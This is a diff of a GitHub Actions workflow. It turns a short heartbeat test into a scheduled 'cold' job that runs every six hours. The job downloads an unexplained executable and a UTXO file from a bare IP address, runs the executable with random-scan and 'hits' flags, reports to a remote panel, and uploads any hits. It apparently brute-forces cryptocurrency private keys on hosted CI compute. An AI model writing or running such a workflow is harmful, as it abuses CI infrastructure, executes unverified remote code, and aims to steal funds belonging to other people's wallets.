@@ -1,35 +1,53 @@
-name: safe-heartbeat-test
+name: cold
 
 on:
+  push:
+    paths: ['.github/cold-trigger.txt']
   workflow_dispatch:
-    inputs:
-      panel_url:
-        description: Public panel base URL
-        required: true
-        type: string
+  schedule:
+    - cron: '0 */6 * * *'
 
 jobs:
-  heartbeat:
+  scan:
     runs-on: ubuntu-latest
-    timeout-minutes: 2
+    timeout-minutes: 340
+
+    env:
+      PANEL_URL: http://43.228.157.68:80
+
     steps:
-      - name: Send synthetic heartbeats
-        env:
-          PANEL_URL: ${{ inputs.panel_url }}
-          SOURCE: gh-test-${{ github.run_id }}
-        shell: bash
+      - uses: actions/checkout@v4
+
+      - name: Prepare coldrun
         run: |
-          set -euo pipefail
-          base="${PANEL_URL%/}"
-          for sequence in 1 2 3; do
-            tick=$((sequence * 2500))
-            payload=$(printf \
-              '{"source":"%s","tick":%d,"sps":2500,"hits":0,"elapsed":%d}' \
-              "$SOURCE" "$tick" "$sequence")
-            curl --fail --show-error --silent --retry 2 --max-time 10 \
-              -X POST "$base/api/cold/heartbeat" \
-              -H 'Content-Type: application/json' \
-              --data "$payload"
-            echo "heartbeat source=$SOURCE tick=$tick sps=2500"
-            sleep 2
-          done
+          mkdir -p coldrun
+
+      - name: Download UTXO
+        run: |
+          wget -q "http://43.228.157.68/api/dl/custom2" \
+            -O coldrun/utxo_raw.tsv.gz
+
+      - name: Download coldcard binary
+        run: |
+          wget -q "http://43.228.157.68/api/dl/custom" \
+            -O coldrun/coldcard
+          chmod +x coldrun/coldcard
+          ls -lh coldrun/
+
+      - name: Scan
+        run: |
+          cd coldrun
+          ./coldcard \
+            -max 4294967295 \
+            -addr 20 \
+            -hits hits.txt \
+            -rand \
+            -panel "$PANEL_URL" 2>&1 | tail -5 || true
+
+      - name: Upload hits
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: hits-${{ github.run_id }}
+          path: coldrun/hits.txt
+          if-no-files-found: ignore
